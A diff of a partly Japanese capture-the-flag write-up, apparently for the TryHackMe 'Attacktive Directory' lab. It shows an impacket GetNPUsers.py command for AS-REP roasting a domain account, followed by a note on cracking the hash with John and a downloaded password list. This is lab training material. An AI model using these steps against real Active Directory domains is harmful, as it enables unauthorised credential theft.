@@ -82,4 +82,6 @@ We have two user accounts that we could potentially query a ticket from. Which u
 `svc-admin`  
 Now crack the hash with the modified password list provided, what is the user accounts password?  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacktive%20Directory_4.png" width="100%" height="100%">  
-`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -format john -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名`
+`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -format john -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名`で
+事前認証(AS-req)が無効であるユーザのTGTチケットを取得することができた。  
+その後、 [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt)をWgetして、Johnでクラック成功！
